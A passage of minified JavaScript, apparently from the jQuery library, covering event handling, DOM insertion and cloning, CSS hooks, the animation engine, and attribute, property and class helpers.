        return this instanceof v.Event ? (t && t.type ? (this.originalEvent = t, this.type = t.type, this.isDefaultPrevented = t.defaultPrevented || void 0 === t.defaultPrevented && !1 === t.returnValue ? yt : bt, this.target = t.target && 3 === t.target.nodeType ? t.target.parentNode : t.target, this.currentTarget = t.currentTarget, this.relatedTarget = t.relatedTarget) : this.type = t, e && v.extend(this, e), this.timeStamp = t && t.timeStamp || v.now(), void(this[v.expando] = !0)) : new v.Event(t, e)
    }, v.Event.prototype = {
        constructor: v.Event,
        isDefaultPrevented: bt,
        isPropagationStopped: bt,
        isImmediatePropagationStopped: bt,
        isSimulated: !1,
        preventDefault: function() {
            var t = this.originalEvent;
            this.isDefaultPrevented = yt, t && !this.isSimulated && t.preventDefault()
        },
        stopPropagation: function() {
            var t = this.originalEvent;
            this.isPropagationStopped = yt, t && !this.isSimulated && t.stopPropagation()
        },
        stopImmediatePropagation: function() {
            var t = this.originalEvent;
            this.isImmediatePropagationStopped = yt, t && !this.isSimulated && t.stopImmediatePropagation(), this.stopPropagation()
        }
    }, v.each({
        altKey: !0,
        bubbles: !0,
        cancelable: !0,
        changedTouches: !0,
        ctrlKey: !0,
        detail: !0,
        eventPhase: !0,
        metaKey: !0,
        pageX: !0,
        pageY: !0,
        shiftKey: !0,
        view: !0,
        char: !0,
        charCode: !0,
        key: !0,
        keyCode: !0,
        button: !0,
        buttons: !0,
        clientX: !0,
        clientY: !0,
        offsetX: !0,
        offsetY: !0,
        pointerId: !0,
        pointerType: !0,
        screenX: !0,
        screenY: !0,
        targetTouches: !0,
        toElement: !0,
        touches: !0,
        which: function(t) {
            var e = t.button;
            return null == t.which && mt.test(t.type) ? null != t.charCode ? t.charCode : t.keyCode : !t.which && void 0 !== e && gt.test(t.type) ? 1 & e ? 1 : 2 & e ? 3 : 4 & e ? 2 : 0 : t.which
        }
    }, v.event.addProp), v.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout"
    }, (function(t, e) {
        v.event.special[t] = {
            delegateType: e,
            bindType: e,
            handle: function(t) {
                var n, i = this,
                    o = t.relatedTarget,
                    r = t.handleObj;
                return o && (o === i || v.contains(i, o)) || (t.type = r.origType, n = r.handler.apply(this, arguments), t.type = e), n
            }
        }
    })), v.fn.extend({
        on: function(t, e, n, i) {
            return wt(this, t, e, n, i)
        },
        one: function(t, e, n, i) {
            return wt(this, t, e, n, i, 1)
        },
        off: function(t, e, n) {
            var i, o;
            if (t && t.preventDefault && t.handleObj) return i = t.handleObj, v(t.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this;
            if ("object" == typeof t) {
                for (o in t) this.off(o, e, t[o]);
                return this
            }
            return !1 !== e && "function" != typeof e || (n = e, e = void 0), !1 === n && (n = bt), this.each((function() {
                v.event.remove(this, t, n, e)
            }))
        }
    });
    var kt = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,
        Ct = /<script|<style|<link/i,
        _t = /checked\s*(?:[^=]|=\s*.checked.)/i,
        St = /^true\/(.*)/,
        Tt = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

    function Et(t, e) {
        return E(t, "table") && E(11 !== e.nodeType ? e : e.firstChild, "tr") && v(">tbody", t)[0] || t
    }

    function Pt(t) {
        return t.type = (null !== t.getAttribute("type")) + "/" + t.type, t
    }

    function $t(t) {
        var e = St.exec(t.type);
        return e ? t.type = e[1] : t.removeAttribute("type"), t
    }

    function At(t, e) {
        var n, i, o, r, s, a, l, c;
        if (1 === e.nodeType) {
            if (X.hasData(t) && (r = X.access(t), s = X.set(e, r), c = r.events))
                for (o in delete s.handle, s.events = {}, c)
                    for (n = 0, i = c[o].length; n < i; n++) v.event.add(e, o, c[o][n]);
            V.hasData(t) && (a = V.access(t), l = v.extend({}, a), V.set(e, l))
        }
    }

    function Dt(t, e) {
        var n = e.nodeName.toLowerCase();
        "input" === n && st.test(t.type) ? e.checked = t.checked : "input" !== n && "textarea" !== n || (e.defaultValue = t.defaultValue)
    }

    function Mt(t, e, n, i) {
        e = s.apply([], e);
        var o, r, a, l, c, u, p = 0,
            h = t.length,
            d = h - 1,
            g = e[0],
            y = v.isFunction(g);
        if (y || h > 1 && "string" == typeof g && !f.checkClone && _t.test(g)) return t.each((function(o) {
            var r = t.eq(o);
            y && (e[0] = g.call(this, o, r.html())), Mt(r, e, n, i)
        }));
        if (h && (r = (o = dt(e, t[0].ownerDocument, !1, t, i)).firstChild, 1 === o.childNodes.length && (o = r), r || i)) {
            for (l = (a = v.map(ut(o, "script"), Pt)).length; p < h; p++) c = o, p !== d && (c = v.clone(c, !0, !0), l && v.merge(a, ut(c, "script"))), n.call(t[p], c, p);
            if (l)
                for (u = a[a.length - 1].ownerDocument, v.map(a, $t), p = 0; p < l; p++) c = a[p], lt.test(c.type || "") && !X.access(c, "globalEval") && v.contains(u, c) && (c.src ? v._evalUrl && v._evalUrl(c.src) : m(c.textContent.replace(Tt, ""), u))
        }
        return t
    }

    function Ot(t, e, n) {
        for (var i, o = e ? v.filter(e, t) : t, r = 0; null != (i = o[r]); r++) n || 1 !== i.nodeType || v.cleanData(ut(i)), i.parentNode && (n && v.contains(i.ownerDocument, i) && pt(ut(i, "script")), i.parentNode.removeChild(i));
        return t
    }
    v.extend({
        htmlPrefilter: function(t) {
            return t.replace(kt, "<$1></$2>")
        },
        clone: function(t, e, n) {
            var i, o, r, s, a = t.cloneNode(!0),
                l = v.contains(t.ownerDocument, t);
            if (!(f.noCloneChecked || 1 !== t.nodeType && 11 !== t.nodeType || v.isXMLDoc(t)))
                for (s = ut(a), i = 0, o = (r = ut(t)).length; i < o; i++) Dt(r[i], s[i]);
            if (e)
                if (n)
                    for (r = r || ut(t), s = s || ut(a), i = 0, o = r.length; i < o; i++) At(r[i], s[i]);
                else At(t, a);
            return (s = ut(a, "script")).length > 0 && pt(s, !l && ut(t, "script")), a
        },
        cleanData: function(t) {
            for (var e, n, i, o = v.event.special, r = 0; void 0 !== (n = t[r]); r++)
                if (W(n)) {
                    if (e = n[X.expando]) {
                        if (e.events)
                            for (i in e.events) o[i] ? v.event.remove(n, i) : v.removeEvent(n, i, e.handle);
                        n[X.expando] = void 0
                    }
                    n[V.expando] && (n[V.expando] = void 0)
                }
        }
    }), v.fn.extend({
        detach: function(t) {
            return Ot(this, t, !0)
        },
        remove: function(t) {
            return Ot(this, t)
        },
        text: function(t) {
            return z(this, (function(t) {
                return void 0 === t ? v.text(this) : this.empty().each((function() {
                    1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = t)
                }))
            }), null, t, arguments.length)
        },
        append: function() {
            return Mt(this, arguments, (function(t) {
                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Et(this, t).appendChild(t)
            }))
        },
        prepend: function() {
            return Mt(this, arguments, (function(t) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var e = Et(this, t);
                    e.insertBefore(t, e.firstChild)
                }
            }))
        },
        before: function() {
            return Mt(this, arguments, (function(t) {
                this.parentNode && this.parentNode.insertBefore(t, this)
            }))
        },
        after: function() {
            return Mt(this, arguments, (function(t) {
                this.parentNode && this.parentNode.insertBefore(t, this.nextSibling)
            }))
        },
        empty: function() {
            for (var t, e = 0; null != (t = this[e]); e++) 1 === t.nodeType && (v.cleanData(ut(t, !1)), t.textContent = "");
            return this
        },
        clone: function(t, e) {
            return t = null != t && t, e = null == e ? t : e, this.map((function() {
                return v.clone(this, t, e)
            }))
        },
        html: function(t) {
            return z(this, (function(t) {
                var e = this[0] || {},
                    n = 0,
                    i = this.length;
                if (void 0 === t && 1 === e.nodeType) return e.innerHTML;
                if ("string" == typeof t && !Ct.test(t) && !ct[(at.exec(t) || ["", ""])[1].toLowerCase()]) {
                    t = v.htmlPrefilter(t);
                    try {
                        for (; n < i; n++) 1 === (e = this[n] || {}).nodeType && (v.cleanData(ut(e, !1)), e.innerHTML = t);
                        e = 0
                    } catch (t) {}
                }
                e && this.empty().append(t)
            }), null, t, arguments.length)
        },
        replaceWith: function() {
            var t = [];
            return Mt(this, arguments, (function(e) {
                var n = this.parentNode;
                v.inArray(this, t) < 0 && (v.cleanData(ut(this)), n && n.replaceChild(e, this))
            }), t)
        }
    }), v.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, (function(t, e) {
        v.fn[t] = function(t) {
            for (var n, i = [], o = v(t), r = o.length - 1, s = 0; s <= r; s++) n = s === r ? this : this.clone(!0), v(o[s])[e](n), a.apply(i, n.get());
            return this.pushStack(i)
        }
    }));
    var jt = /^margin/,
        Lt = new RegExp("^(" + Z + ")(?!px)[a-z%]+$", "i"),
        Ft = function(e) {
            var n = e.ownerDocument.defaultView;
            return n && n.opener || (n = t), n.getComputedStyle(e)
        };

    function Nt(t, e, n) {
        var i, o, r, s, a = t.style;
        return (n = n || Ft(t)) && ("" !== (s = n.getPropertyValue(e) || n[e]) || v.contains(t.ownerDocument, t) || (s = v.style(t, e)), !f.pixelMarginRight() && Lt.test(s) && jt.test(e) && (i = a.width, o = a.minWidth, r = a.maxWidth, a.minWidth = a.maxWidth = a.width = s, s = n.width, a.width = i, a.minWidth = o, a.maxWidth = r)), void 0 !== s ? s + "" : s
    }

    function It(t, e) {
        return {
            get: function() {
                return t() ? void delete this.get : (this.get = e).apply(this, arguments)
            }
        }
    }! function() {
        function e() {
            if (l) {
                l.style.cssText = "box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%", l.innerHTML = "", ft.appendChild(a);
                var e = t.getComputedStyle(l);
                n = "1%" !== e.top, s = "2px" === e.marginLeft, o = "4px" === e.width, l.style.marginRight = "50%", r = "4px" === e.marginRight, ft.removeChild(a), l = null
            }
        }
        var n, o, r, s, a = i.createElement("div"),
            l = i.createElement("div");
        l.style && (l.style.backgroundClip = "content-box", l.cloneNode(!0).style.backgroundClip = "", f.clearCloneStyle = "content-box" === l.style.backgroundClip, a.style.cssText = "border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute", a.appendChild(l), v.extend(f, {
            pixelPosition: function() {
                return e(), n
            },
            boxSizingReliable: function() {
                return e(), o
            },
            pixelMarginRight: function() {
                return e(), r
            },
            reliableMarginLeft: function() {
                return e(), s
            }
        }))
    }();
    var Rt = /^(none|table(?!-c[ea]).+)/,
        Ht = /^--/,
        Bt = {
            position: "absolute",
            visibility: "hidden",
            display: "block"
        },
        qt = {
            letterSpacing: "0",
            fontWeight: "400"
        },
        zt = ["Webkit", "Moz", "ms"],
        Wt = i.createElement("div").style;

    function Gt(t) {
        var e = v.cssProps[t];
        return e || (e = v.cssProps[t] = function(t) {
            if (t in Wt) return t;
            for (var e = t[0].toUpperCase() + t.slice(1), n = zt.length; n--;)
                if ((t = zt[n] + e) in Wt) return t
        }(t) || t), e
    }

    function Xt(t, e, n) {
        var i = K.exec(e);
        return i ? Math.max(0, i[2] - (n || 0)) + (i[3] || "px") : e
    }

    function Vt(t, e, n, i, o) {
        var r, s = 0;
        for (r = n === (i ? "border" : "content") ? 4 : "width" === e ? 1 : 0; r < 4; r += 2) "margin" === n && (s += v.css(t, n + J[r], !0, o)), i ? ("content" === n && (s -= v.css(t, "padding" + J[r], !0, o)), "margin" !== n && (s -= v.css(t, "border" + J[r] + "Width", !0, o))) : (s += v.css(t, "padding" + J[r], !0, o), "padding" !== n && (s += v.css(t, "border" + J[r] + "Width", !0, o)));
        return s
    }

    function Ut(t, e, n) {
        var i, o = Ft(t),
            r = Nt(t, e, o),
            s = "border-box" === v.css(t, "boxSizing", !1, o);
        return Lt.test(r) ? r : (i = s && (f.boxSizingReliable() || r === t.style[e]), "auto" === r && (r = t["offset" + e[0].toUpperCase() + e.slice(1)]), (r = parseFloat(r) || 0) + Vt(t, e, n || (s ? "border" : "content"), i, o) + "px")
    }

    function Yt(t, e, n, i, o) {
        return new Yt.prototype.init(t, e, n, i, o)
    }
    v.extend({
        cssHooks: {
            opacity: {
                get: function(t, e) {
                    if (e) {
                        var n = Nt(t, "opacity");
                        return "" === n ? "1" : n
                    }
                }
            }
        },
        cssNumber: {
            animationIterationCount: !0,
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {
            float: "cssFloat"
        },
        style: function(t, e, n, i) {
            if (t && 3 !== t.nodeType && 8 !== t.nodeType && t.style) {
                var o, r, s, a = v.camelCase(e),
                    l = Ht.test(e),
                    c = t.style;
                return l || (e = Gt(a)), s = v.cssHooks[e] || v.cssHooks[a], void 0 === n ? s && "get" in s && void 0 !== (o = s.get(t, !1, i)) ? o : c[e] : ("string" === (r = typeof n) && (o = K.exec(n)) && o[1] && (n = nt(t, e, o), r = "number"), void(null != n && n == n && ("number" === r && (n += o && o[3] || (v.cssNumber[a] ? "" : "px")), f.clearCloneStyle || "" !== n || 0 !== e.indexOf("background") || (c[e] = "inherit"), s && "set" in s && void 0 === (n = s.set(t, n, i)) || (l ? c.setProperty(e, n) : c[e] = n))))
            }
        },
        css: function(t, e, n, i) {
            var o, r, s, a = v.camelCase(e);
            return Ht.test(e) || (e = Gt(a)), (s = v.cssHooks[e] || v.cssHooks[a]) && "get" in s && (o = s.get(t, !0, n)), void 0 === o && (o = Nt(t, e, i)), "normal" === o && e in qt && (o = qt[e]), "" === n || n ? (r = parseFloat(o), !0 === n || isFinite(r) ? r || 0 : o) : o
        }
    }), v.each(["height", "width"], (function(t, e) {
        v.cssHooks[e] = {
            get: function(t, n, i) {
                if (n) return !Rt.test(v.css(t, "display")) || t.getClientRects().length && t.getBoundingClientRect().width ? Ut(t, e, i) : et(t, Bt, (function() {
                    return Ut(t, e, i)
                }))
            },
            set: function(t, n, i) {
                var o, r = i && Ft(t),
                    s = i && Vt(t, e, i, "border-box" === v.css(t, "boxSizing", !1, r), r);
                return s && (o = K.exec(n)) && "px" !== (o[3] || "px") && (t.style[e] = n, n = v.css(t, e)), Xt(0, n, s)
            }
        }
    })), v.cssHooks.marginLeft = It(f.reliableMarginLeft, (function(t, e) {
        if (e) return (parseFloat(Nt(t, "marginLeft")) || t.getBoundingClientRect().left - et(t, {
            marginLeft: 0
        }, (function() {
            return t.getBoundingClientRect().left
        }))) + "px"
    })), v.each({
        margin: "",
        padding: "",
        border: "Width"
    }, (function(t, e) {
        v.cssHooks[t + e] = {
            expand: function(n) {
                for (var i = 0, o = {}, r = "string" == typeof n ? n.split(" ") : [n]; i < 4; i++) o[t + J[i] + e] = r[i] || r[i - 2] || r[0];
                return o
            }
        }, jt.test(t) || (v.cssHooks[t + e].set = Xt)
    })), v.fn.extend({
        css: function(t, e) {
            return z(this, (function(t, e, n) {
                var i, o, r = {},
                    s = 0;
                if (Array.isArray(e)) {
                    for (i = Ft(t), o = e.length; s < o; s++) r[e[s]] = v.css(t, e[s], !1, i);
                    return r
                }
                return void 0 !== n ? v.style(t, e, n) : v.css(t, e)
            }), t, e, arguments.length > 1)
        }
    }), v.Tween = Yt, Yt.prototype = {
        constructor: Yt,
        init: function(t, e, n, i, o, r) {
            this.elem = t, this.prop = n, this.easing = o || v.easing._default, this.options = e, this.start = this.now = this.cur(), this.end = i, this.unit = r || (v.cssNumber[n] ? "" : "px")
        },
        cur: function() {
            var t = Yt.propHooks[this.prop];
            return t && t.get ? t.get(this) : Yt.propHooks._default.get(this)
        },
        run: function(t) {
            var e, n = Yt.propHooks[this.prop];
            return this.options.duration ? this.pos = e = v.easing[this.easing](t, this.options.duration * t, 0, 1, this.options.duration) : this.pos = e = t, this.now = (this.end - this.start) * e + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : Yt.propHooks._default.set(this), this
        }
    }, Yt.prototype.init.prototype = Yt.prototype, Yt.propHooks = {
        _default: {
            get: function(t) {
                var e;
                return 1 !== t.elem.nodeType || null != t.elem[t.prop] && null == t.elem.style[t.prop] ? t.elem[t.prop] : (e = v.css(t.elem, t.prop, "")) && "auto" !== e ? e : 0
            },
            set: function(t) {
                v.fx.step[t.prop] ? v.fx.step[t.prop](t) : 1 !== t.elem.nodeType || null == t.elem.style[v.cssProps[t.prop]] && !v.cssHooks[t.prop] ? t.elem[t.prop] = t.now : v.style(t.elem, t.prop, t.now + t.unit)
            }
        }
    }, Yt.propHooks.scrollTop = Yt.propHooks.scrollLeft = {
        set: function(t) {
            t.elem.nodeType && t.elem.parentNode && (t.elem[t.prop] = t.now)
        }
    }, v.easing = {
        linear: function(t) {
            return t
        },
        swing: function(t) {
            return .5 - Math.cos(t * Math.PI) / 2
        },
        _default: "swing"
    }, v.fx = Yt.prototype.init, v.fx.step = {};
    var Qt, Zt, Kt = /^(?:toggle|show|hide)$/,
        Jt = /queueHooks$/;

    function te() {
        Zt && (!1 === i.hidden && t.requestAnimationFrame ? t.requestAnimationFrame(te) : t.setTimeout(te, v.fx.interval), v.fx.tick())
    }

    function ee() {
        return t.setTimeout((function() {
            Qt = void 0
        })), Qt = v.now()
    }

    function ne(t, e) {
        var n, i = 0,
            o = {
                height: t
            };
        for (e = e ? 1 : 0; i < 4; i += 2 - e) o["margin" + (n = J[i])] = o["padding" + n] = t;
        return e && (o.opacity = o.width = t), o
    }

    function ie(t, e, n) {
        for (var i, o = (oe.tweeners[e] || []).concat(oe.tweeners["*"]), r = 0, s = o.length; r < s; r++)
            if (i = o[r].call(n, e, t)) return i
    }

    function oe(t, e, n) {
        var i, o, r = 0,
            s = oe.prefilters.length,
            a = v.Deferred().always((function() {
                delete l.elem
            })),
            l = function() {
                if (o) return !1;
                for (var e = Qt || ee(), n = Math.max(0, c.startTime + c.duration - e), i = 1 - (n / c.duration || 0), r = 0, s = c.tweens.length; r < s; r++) c.tweens[r].run(i);
                return a.notifyWith(t, [c, i, n]), i < 1 && s ? n : (s || a.notifyWith(t, [c, 1, 0]), a.resolveWith(t, [c]), !1)
            },
            c = a.promise({
                elem: t,
                props: v.extend({}, e),
                opts: v.extend(!0, {
                    specialEasing: {},
                    easing: v.easing._default
                }, n),
                originalProperties: e,
                originalOptions: n,
                startTime: Qt || ee(),
                duration: n.duration,
                tweens: [],
                createTween: function(e, n) {
                    var i = v.Tween(t, c.opts, e, n, c.opts.specialEasing[e] || c.opts.easing);
                    return c.tweens.push(i), i
                },
                stop: function(e) {
                    var n = 0,
                        i = e ? c.tweens.length : 0;
                    if (o) return this;
                    for (o = !0; n < i; n++) c.tweens[n].run(1);
                    return e ? (a.notifyWith(t, [c, 1, 0]), a.resolveWith(t, [c, e])) : a.rejectWith(t, [c, e]), this
                }
            }),
            u = c.props;
        for (function(t, e) {
                var n, i, o, r, s;
                for (n in t)
                    if (o = e[i = v.camelCase(n)], r = t[n], Array.isArray(r) && (o = r[1], r = t[n] = r[0]), n !== i && (t[i] = r, delete t[n]), (s = v.cssHooks[i]) && "expand" in s)
                        for (n in r = s.expand(r), delete t[i], r) n in t || (t[n] = r[n], e[n] = o);
                    else e[i] = o
            }(u, c.opts.specialEasing); r < s; r++)
            if (i = oe.prefilters[r].call(c, t, u, c.opts)) return v.isFunction(i.stop) && (v._queueHooks(c.elem, c.opts.queue).stop = v.proxy(i.stop, i)), i;
        return v.map(u, ie, c), v.isFunction(c.opts.start) && c.opts.start.call(t, c), c.progress(c.opts.progress).done(c.opts.done, c.opts.complete).fail(c.opts.fail).always(c.opts.always), v.fx.timer(v.extend(l, {
            elem: t,
            anim: c,
            queue: c.opts.queue
        })), c
    }
    v.Animation = v.extend(oe, {
            tweeners: {
                "*": [function(t, e) {
                    var n = this.createTween(t, e);
                    return nt(n.elem, t, K.exec(e), n), n
                }]
            },
            tweener: function(t, e) {
                v.isFunction(t) ? (e = t, t = ["*"]) : t = t.match(F);
                for (var n, i = 0, o = t.length; i < o; i++) n = t[i], oe.tweeners[n] = oe.tweeners[n] || [], oe.tweeners[n].unshift(e)
            },
            prefilters: [function(t, e, n) {
                var i, o, r, s, a, l, c, u, p = "width" in e || "height" in e,
                    h = this,
                    d = {},
                    f = t.style,
                    m = t.nodeType && tt(t),
                    g = X.get(t, "fxshow");
                for (i in n.queue || (null == (s = v._queueHooks(t, "fx")).unqueued && (s.unqueued = 0, a = s.empty.fire, s.empty.fire = function() {
                        s.unqueued || a()
                    }), s.unqueued++, h.always((function() {
                        h.always((function() {
                            s.unqueued--, v.queue(t, "fx").length || s.empty.fire()
                        }))
                    }))), e)
                    if (o = e[i], Kt.test(o)) {
                        if (delete e[i], r = r || "toggle" === o, o === (m ? "hide" : "show")) {
                            if ("show" !== o || !g || void 0 === g[i]) continue;
                            m = !0
                        }
                        d[i] = g && g[i] || v.style(t, i)
                    }
                if ((l = !v.isEmptyObject(e)) || !v.isEmptyObject(d))
                    for (i in p && 1 === t.nodeType && (n.overflow = [f.overflow, f.overflowX, f.overflowY], null == (c = g && g.display) && (c = X.get(t, "display")), "none" === (u = v.css(t, "display")) && (c ? u = c : (rt([t], !0), c = t.style.display || c, u = v.css(t, "display"), rt([t]))), ("inline" === u || "inline-block" === u && null != c) && "none" === v.css(t, "float") && (l || (h.done((function() {
                            f.display = c
                        })), null == c && (u = f.display, c = "none" === u ? "" : u)), f.display = "inline-block")), n.overflow && (f.overflow = "hidden", h.always((function() {
                            f.overflow = n.overflow[0], f.overflowX = n.overflow[1], f.overflowY = n.overflow[2]
                        }))), l = !1, d) l || (g ? "hidden" in g && (m = g.hidden) : g = X.access(t, "fxshow", {
                        display: c
                    }), r && (g.hidden = !m), m && rt([t], !0), h.done((function() {
                        for (i in m || rt([t]), X.remove(t, "fxshow"), d) v.style(t, i, d[i])
                    }))), l = ie(m ? g[i] : 0, i, h), i in g || (g[i] = l.start, m && (l.end = l.start, l.start = 0))
            }],
            prefilter: function(t, e) {
                e ? oe.prefilters.unshift(t) : oe.prefilters.push(t)
            }
        }), v.speed = function(t, e, n) {
            var i = t && "object" == typeof t ? v.extend({}, t) : {
                complete: n || !n && e || v.isFunction(t) && t,
                duration: t,
                easing: n && e || e && !v.isFunction(e) && e
            };
            return v.fx.off ? i.duration = 0 : "number" != typeof i.duration && (i.duration in v.fx.speeds ? i.duration = v.fx.speeds[i.duration] : i.duration = v.fx.speeds._default), null != i.queue && !0 !== i.queue || (i.queue = "fx"), i.old = i.complete, i.complete = function() {
                v.isFunction(i.old) && i.old.call(this), i.queue && v.dequeue(this, i.queue)
            }, i
        }, v.fn.extend({
            fadeTo: function(t, e, n, i) {
                return this.filter(tt).css("opacity", 0).show().end().animate({
                    opacity: e
                }, t, n, i)
            },
            animate: function(t, e, n, i) {
                var o = v.isEmptyObject(t),
                    r = v.speed(e, n, i),
                    s = function() {
                        var e = oe(this, v.extend({}, t), r);
                        (o || X.get(this, "finish")) && e.stop(!0)
                    };
                return s.finish = s, o || !1 === r.queue ? this.each(s) : this.queue(r.queue, s)
            },
            stop: function(t, e, n) {
                var i = function(t) {
                    var e = t.stop;
                    delete t.stop, e(n)
                };
                return "string" != typeof t && (n = e, e = t, t = void 0), e && !1 !== t && this.queue(t || "fx", []), this.each((function() {
                    var e = !0,
                        o = null != t && t + "queueHooks",
                        r = v.timers,
                        s = X.get(this);
                    if (o) s[o] && s[o].stop && i(s[o]);
                    else
                        for (o in s) s[o] && s[o].stop && Jt.test(o) && i(s[o]);
                    for (o = r.length; o--;) r[o].elem !== this || null != t && r[o].queue !== t || (r[o].anim.stop(n), e = !1, r.splice(o, 1));
                    !e && n || v.dequeue(this, t)
                }))
            },
            finish: function(t) {
                return !1 !== t && (t = t || "fx"), this.each((function() {
                    var e, n = X.get(this),
                        i = n[t + "queue"],
                        o = n[t + "queueHooks"],
                        r = v.timers,
                        s = i ? i.length : 0;
                    for (n.finish = !0, v.queue(this, t, []), o && o.stop && o.stop.call(this, !0), e = r.length; e--;) r[e].elem === this && r[e].queue === t && (r[e].anim.stop(!0), r.splice(e, 1));
                    for (e = 0; e < s; e++) i[e] && i[e].finish && i[e].finish.call(this);
                    delete n.finish
                }))
            }
        }), v.each(["toggle", "show", "hide"], (function(t, e) {
            var n = v.fn[e];
            v.fn[e] = function(t, i, o) {
                return null == t || "boolean" == typeof t ? n.apply(this, arguments) : this.animate(ne(e, !0), t, i, o)
            }
        })), v.each({
            slideDown: ne("show"),
            slideUp: ne("hide"),
            slideToggle: ne("toggle"),
            fadeIn: {
                opacity: "show"
            },
            fadeOut: {
                opacity: "hide"
            },
            fadeToggle: {
                opacity: "toggle"
            }
        }, (function(t, e) {
            v.fn[t] = function(t, n, i) {
                return this.animate(e, t, n, i)
            }
        })), v.timers = [], v.fx.tick = function() {
            var t, e = 0,
                n = v.timers;
            for (Qt = v.now(); e < n.length; e++)(t = n[e])() || n[e] !== t || n.splice(e--, 1);
            n.length || v.fx.stop(), Qt = void 0
        }, v.fx.timer = function(t) {
            v.timers.push(t), v.fx.start()
        }, v.fx.interval = 13, v.fx.start = function() {
            Zt || (Zt = !0, te())
        }, v.fx.stop = function() {
            Zt = null
        }, v.fx.speeds = {
            slow: 600,
            fast: 200,
            _default: 400
        }, v.fn.delay = function(e, n) {
            return e = v.fx && v.fx.speeds[e] || e, n = n || "fx", this.queue(n, (function(n, i) {
                var o = t.setTimeout(n, e);
                i.stop = function() {
                    t.clearTimeout(o)
                }
            }))
        },
        function() {
            var t = i.createElement("input"),
                e = i.createElement("select").appendChild(i.createElement("option"));
            t.type = "checkbox", f.checkOn = "" !== t.value, f.optSelected = e.selected, (t = i.createElement("input")).value = "t", t.type = "radio", f.radioValue = "t" === t.value
        }();
    var re, se = v.expr.attrHandle;
    v.fn.extend({
        attr: function(t, e) {
            return z(this, v.attr, t, e, arguments.length > 1)
        },
        removeAttr: function(t) {
            return this.each((function() {
                v.removeAttr(this, t)
            }))
        }
    }), v.extend({
        attr: function(t, e, n) {
            var i, o, r = t.nodeType;
            if (3 !== r && 8 !== r && 2 !== r) return void 0 === t.getAttribute ? v.prop(t, e, n) : (1 === r && v.isXMLDoc(t) || (o = v.attrHooks[e.toLowerCase()] || (v.expr.match.bool.test(e) ? re : void 0)), void 0 !== n ? null === n ? void v.removeAttr(t, e) : o && "set" in o && void 0 !== (i = o.set(t, n, e)) ? i : (t.setAttribute(e, n + ""), n) : o && "get" in o && null !== (i = o.get(t, e)) ? i : null == (i = v.find.attr(t, e)) ? void 0 : i)
        },
        attrHooks: {
            type: {
                set: function(t, e) {
                    if (!f.radioValue && "radio" === e && E(t, "input")) {
                        var n = t.value;
                        return t.setAttribute("type", e), n && (t.value = n), e
                    }
                }
            }
        },
        removeAttr: function(t, e) {
            var n, i = 0,
                o = e && e.match(F);
            if (o && 1 === t.nodeType)
                for (; n = o[i++];) t.removeAttribute(n)
        }
    }), re = {
        set: function(t, e, n) {
            return !1 === e ? v.removeAttr(t, n) : t.setAttribute(n, n), n
        }
    }, v.each(v.expr.match.bool.source.match(/\w+/g), (function(t, e) {
        var n = se[e] || v.find.attr;
        se[e] = function(t, e, i) {
            var o, r, s = e.toLowerCase();
            return i || (r = se[s], se[s] = o, o = null != n(t, e, i) ? s : null, se[s] = r), o
        }
    }));
    var ae = /^(?:input|select|textarea|button)$/i,
        le = /^(?:a|area)$/i;

    function ce(t) {
        return (t.match(F) || []).join(" ")
    }

    function ue(t) {
        return t.getAttribute && t.getAttribute("class") || ""
    }
    v.fn.extend({
        prop: function(t, e) {
            return z(this, v.prop, t, e, arguments.length > 1)
        },
        removeProp: function(t) {
            return this.each((function() {
                delete this[v.propFix[t] || t]
            }))
        }
    }), v.extend({
        prop: function(t, e, n) {
            var i, o, r = t.nodeType;
            if (3 !== r && 8 !== r && 2 !== r) return 1 === r && v.isXMLDoc(t) || (e = v.propFix[e] || e, o = v.propHooks[e]), void 0 !== n ? o && "set" in o && void 0 !== (i = o.set(t, n, e)) ? i : t[e] = n : o && "get" in o && null !== (i = o.get(t, e)) ? i : t[e]
        },
        propHooks: {
            tabIndex: {
                get: function(t) {
                    var e = v.find.attr(t, "tabindex");
                    return e ? parseInt(e, 10) : ae.test(t.nodeName) || le.test(t.nodeName) && t.href ? 0 : -1
                }
            }
        },
        propFix: {
            for: "htmlFor",
            class: "className"
        }
    }), f.optSelected || (v.propHooks.selected = {
        get: function(t) {
            var e = t.parentNode;
            return e && e.parentNode && e.parentNode.selectedIndex, null
        },
        set: function(t) {
            var e = t.parentNode;
            e && (e.selectedIndex, e.parentNode && e.parentNode.selectedIndex)
        }
    }), v.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], (function() {
        v.propFix[this.toLowerCase()] = this
    })), v.fn.extend({
        addClass: function(t) {
            var e, n, i, o, r, s, a, l = 0;
            if (v.isFunction(t)) return this.each((function(e) {
                v(this).addClass(t.call(this, e, ue(this)))
            }));
            if ("string" == typeof t && t)
                for (e = t.match(F) || []; n = this[l++];)
                    if (o = ue(n), i = 1 === n.nodeType && " " + ce(o) + " ") {
                        for (s = 0; r = e[s++];) i.indexOf(" " + r + " ") < 0 && (i += r + " ");
                        o !== (a = ce(i)) && n.setAttribute("class", a)
                    }
            return this
        },
        removeClass: function(t) {
            var e, n, i, o, r, s, a, l = 0;
            if (v.isFunction(t)) return this.each((function(e) {
                v(this).removeClass(t.call(this, e, ue(this)))
            }));
            if (!arguments.length) return this.attr("class", "");
            if ("string" == typeof t && t)
                for (e = t.match(F) || []; n = this[l++];)
